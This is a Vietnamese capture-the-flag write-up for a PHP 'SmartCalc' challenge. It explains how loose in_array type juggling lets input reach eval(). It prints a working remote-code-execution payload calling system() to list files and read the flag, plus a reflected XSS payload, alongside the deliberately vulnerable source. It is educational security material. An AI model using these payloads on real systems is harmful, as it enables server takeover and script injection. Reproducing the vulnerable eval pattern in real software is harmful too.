## Type juggling

Yêu cầu của đề bài: Remote Code Execution được server và kiếm được FLAG

Sau khi truy cập link ta thấy:

![image](https://user-images.githubusercontent.com/90561566/234309331-ebfaefa2-acda-4923-9e4e-9b6726f2d7f7.png)

Ấn vào button source, ta được chuyển tới page debug

Trang cung cấp cho ta source code của challenge này:

```
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>MyApp Home</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="column">
        <h1>>SmartCalc.exe_</h1>

        <?php

        ini_set('display_errors','On');
        ini_set('error_reporting','E_ALL');
        error_reporting(E_ALL);
        if(isset($_GET['debug'])) die(highlight_file(__FILE__));

        $whitelist_numbers =  range(1,1000);
        $whitelist_ops = array("+","-","*","/");

        $param1 = $_GET['p1'];
        $param2 = $_GET['p2'];
        $operator = $_GET['op'];

        if( in_array($param1, $whitelist_numbers) && in_array($param2, $whitelist_numbers) && in_array($operator, $whitelist_ops) ){
            $exec = "${param1} ${operator} ${param2}";
            $evalcode = "return $exec;";

            echo "<details><summary>DEBUG</summary>";
            echo "PHP sẽ thực thi eval code sau đây:";
            echo "<pre>$evalcode</pre>";
            echo "</details><br>";

            // Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
            echo $exec . " = ". eval($evalcode);
        } else {
            echo "Not supported";
        }

        ?>
    </pre>
    <p>👉 <a href="?p1=191&p2=7&op=*">example</a><br>🤖 <a href="?debug">source</a></p>
</div>
</body>
```

Khử 1 vài nhiễu trong đề bài

Khi đọc đề nếu như bạn chưa quen với PHP thì khi đọc code có thể sẽ bị đi lan man vào nhiều phần không cần thiết. Ở đoạn code trên có 1 dòng mà nhiều người nghĩ là quan trọng:

```
if(isset($_GET['debug'])) die(highlight_file(__FILE__));
```

Dòng này có 1 khối if mà trong đó có hàm isset() và tham số truyền vào là biến debug, biến debug được truyền vào từ URL, cụ thể nó ở sau dấu ? trên URL.

![image](https://user-images.githubusercontent.com/90561566/234310582-6906c178-d14e-4195-ba96-cf6a72bed2d9.png)

Vậy thì nếu biến debug được truyền vào thì sẽ chạy code bên trong khối if, khối code đó là **die(highlight_file(_FILE_)); **. Hàm highlight_file() có nhiệm vụ hiển thị source code của file, tham số _FILE_ chính là đường dẫn đến thư mục hiện tại. Hàm die() có nhiệm vụ dừng việc thực thi script, có nghĩa là các đoạn code phía sau hàm này sẽ không được thực thi. 

Tổng kết lại thì nếu truyền biến debug vào thì chương trình in ra source code của file hiện tại (đây lý do bạn nhìn thấy code của thử thách này).

Do yêu cầu của đề bài là RCE nên mình search google và biết được hàm eval() trong PHP có thể là vector để RCE. Bởi vì hàm eval() cho phép tham số truyền vào được thực thi dưới dạng code PHP bình thường, nếu để người dùng tùy ý thay đổi tham số này thì rất có thể hàm như system() sẽ được gọi để thực thi code, dẫn tới việc RCE.

```
if (in_array($param1, $whitelist_numbers) && in_array($param2, $whitelist_numbers) && in_array($operator, $whitelist_ops)) {
    $exec = "${param1} ${operator} ${param2}";
    $evalcode = "return $exec;";

    echo "<details>
    <summary>DEBUG</summary>";
    echo "PHP sẽ thực thi eval code sau đây:";
    echo "
    <pre>$evalcode</pre>";
    echo "
</details><br>";

    // Nếu chưa biết về eval có thể đọc ở đây: https://php.net/eval
    echo $exec . " = " . eval($evalcode);
} else {
    echo "Not supported";
}
```

Để đến được hàm eval() thì như ta thấy có 1 khối điều kiện if dưới dạng 3 điều kiện and để kiểm tra các tham số và toán tử có nằm trong whitelist hay không.

Bài này được xây dựng dựa trên 1 hành vi của ngôn ngữ PHP, đó là PHP TYPE JUGGLING. CyberJutsu có 2 slide nói về điều này.

![image](https://user-images.githubusercontent.com/90561566/234313216-474347ea-b88c-40ff-9cc4-c8d88d9698c1.png)

![image](https://user-images.githubusercontent.com/90561566/234313292-3176d372-03b2-4908-864b-01da0e7b5c14.png)

Đọc xong 2 cái slide này thì mình phải thốt lên: Ảo thật đấy!

Mình đã thử var_dump((int)"1lasfas") và nó vẫn trả về int(1). Mình nhận ra chỉ cần ném con số 1 ra đằng trước thì đằng sau mình ghi chuỗi gì thì nó vẫn trả về (int)1. Vậy thì bypass 2 toán hạng in_array($param1, $whitelist_numbers) và in_array($param2, $whitelist_numbers) để nó trả về true cũng dễ thôi.

```
$param1 = $_GET['p1'];
$whitelist_numbers = range(1, 1000); //whitelist trải dài từ 1->1000
```

Mình truyền tham số như sau: in_array("1fasfsaf", $whitelist_numbers) thì kiểu gì hàm in_array cũng trả về true.

Cơ mà 1 điều lưu ý ở đây là nó chỉ trả về true nếu phiên bản PHP là 7.4.0: 7.4.28, từ các phiên bản PHP 8.0.1: 8.0.17, 8.1.0: 8.1.4 nó sẽ trả về false.

Tất nhiên chúng ta còn 1 điều quan trọng nữa thực hiện được RCE, đó chính là ta cần cho hàm eval() chạy những command mà ta muốn. Ta thấy hàm eval() được truyền vào tham số $evalcode.

Mình tưởng tượng biến $evalcode sẽ có dạng "return 1 * 1 . system('lệnh cần gọi');". Mình search thì biết hàm system() sẽ trả về 1 chuỗi nếu như lệnh bên trong là đúng, ngược lại nếu lệnh bên trong sai thì nó sẽ trả về false.

Lúc này nếu biến $evalcode được thực thi như 1 đoạn code PHP thì nó sẽ trả về 1 chuỗi khi thực thi hàm system", vậy thì coi như những kết quả trả về từ hàm system() sẽ được in hết lên trang web dưới dạng string.

Giá trị các biến mà mình truyền vào sẽ như sau:

```
$param1 = "1";
$param2 = "1 . system('lệnh cần gọi')";
$operator = "*";
```

Để truyền các payload qua HTTP GET Protocol thì mình cần truyền vào sau dấu ? trên thanh URL như sau: `p1=1&p2=1 . system('ls -la')&op=*`. Do truyền qua GET Protocol thì các biến như p1, p2,op phải được encode trước khi gửi. 

Vậy cuối cùng payload sẽ là `p1=1&p2=1%20.%20system(%27ls+-la%27)&op=*`. Sau khi gửi thì server trả về đoạn code HTML trông như sau

![image](https://user-images.githubusercontent.com/90561566/234314752-f7287bb6-49fb-4a66-8ccc-34c903d3ce4f.png)

 Mình thử xem các file ở thư mục root bằng câu lệnh ls / -la, kết quả trả về:

![image](https://user-images.githubusercontent.com/90561566/234315182-6371116c-7df3-49df-9bd1-84637e2a25bc.png)

Xem nội dung file này bằng lệnh `cat /DAY_LA_CAI_FLAG_CHUC_MUNG_BAN`, kết quả trả về:

> Flag là `CBJS{type_juggling_PHP_is_weird}`

Ngoài ra thì mình biết là vẫn còn 1 lỗi bị bỏ sót, đó là Reflected XSS. Nhìn lại 1 chút đoạn code sau:

```
$exec = "${param1} ${operator} ${param2}"; //1
$evalcode = "return $exec;"; //2 

echo "<details><summary>DEBUG</summary>"; //3
echo "PHP sẽ thực thi eval code sau đây:"; //4
echo "<pre>$evalcode</pre>"; //5
```

Ở là dòng 5 có thể là 1 nơi có thể dẫn đến Reflected XSS. Vì $evalcode ở dòng này sẽ in ra dưới dạng string, mà string trả về cho phía Client nếu như không được filter thì rất dễ xảy ra việc XSS, ở đây là Reflected XSS. 

Chúng ta sẽ cố gắng chèn được thẻ script để thực thi JS tại trình duyệt, mình sẽ dùng hàm alert để hiện thị ra 1 popup hiển thị domain của trình duyệt, chứng minh mình XSS được trên đó. Payload truyền vào param1, param2, operator vẫn phải thỏa mãn các điều kiện mà mình đã phân tích ở trên. Hãy tưởng tượng ở dòng 1 mình truyền vào payload như sau:

```
$exec = "1<script>alert(document.domain)</script> / 1"; 
//param1 = "1<script>alert(document.domain)</script>"
//param2 = "1"
//operator = "/"
```

Từ payload trên bạn có thể tưởng tượng đoạn script của JS có thể được thực thi ngay tại trình duyệt. Đây là kết quả của nó, mình cho phép hiển thị ra pop-up in ra domain của trang web này:

![image](https://user-images.githubusercontent.com/90561566/234316187-59378a20-de85-43f0-852c-b2af034a37a7.png)
